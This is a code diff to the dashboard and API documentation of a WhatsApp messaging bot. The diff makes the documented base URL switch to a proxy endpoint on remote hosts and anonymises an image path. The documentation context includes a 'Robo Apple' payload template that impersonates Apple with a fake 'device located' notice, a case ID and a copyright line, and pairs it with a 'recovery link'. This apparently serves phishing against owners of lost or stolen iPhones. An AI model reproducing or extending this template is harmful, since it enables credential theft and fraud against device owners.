@@ -530,7 +530,7 @@ $baseTexts = [
                          <h6 class="fw-bold text-primary">1. AUTENTICAÇÃO (Bearer)</h6>
                          <p class="small text-muted">Todas as chamadas exigem o Header:</p>
                          <code class="d-block bg-black p-2 rounded small">Authorization: Bearer {API_KEY}</code>
-                         <p class="small text-muted mt-2">Base URL: <code class="bg-black p-1 rounded">http://localhost:3000</code></p>
+                         <p class="small text-muted mt-2">Base URL: <code class="bg-black p-1 rounded" id="doc-base-url-1">http://localhost:3000</code></p>
                       </div>
                    </div>
                    <div class="col-md-6">
@@ -569,7 +569,7 @@ $baseTexts = [
 - **Management:** Generate and revoke keys in the "Chaves API" tab.
 
 ## 2. Global Endpoints
-- **API URL:** `http://localhost:3000`
+- **API URL:** <code id="doc-base-url-2">http://localhost:3000</code>
 - **Dashboard API:** `api_actions.php` (Internal)
 
 ## 3. Advanced Bot Automation (Template System)
@@ -587,7 +587,7 @@ To replicate the "Robo Apple" behavior perfectly, use the following payload stru
   "session": "thiago",
   "number": "5541995810993",
   "message": "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*",
-  "mediaPath": "C:/Users/Christofer Mayon/Desktop/robo/botzap/uploads/Dynamic.png",
+  "mediaPath": "uploads/sua-imagem.png",
   "trackLink": "https://seu-link-de-recuperacao.com",
   "language": "pt"
 }
@@ -1465,6 +1465,12 @@ $(document).ready(function() {
 
     // Eventos herdados
     $('#device-search').on('input', filterDevices);
+
+    // Ajuste dinâmico da documentação conforme o ambiente
+    if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
+        const remoteUrl = window.location.origin + '/api/proxy.php?path=';
+        $('#doc-base-url-1, #doc-base-url-2').text(remoteUrl);
+    }
 });
 </script>
 </body>
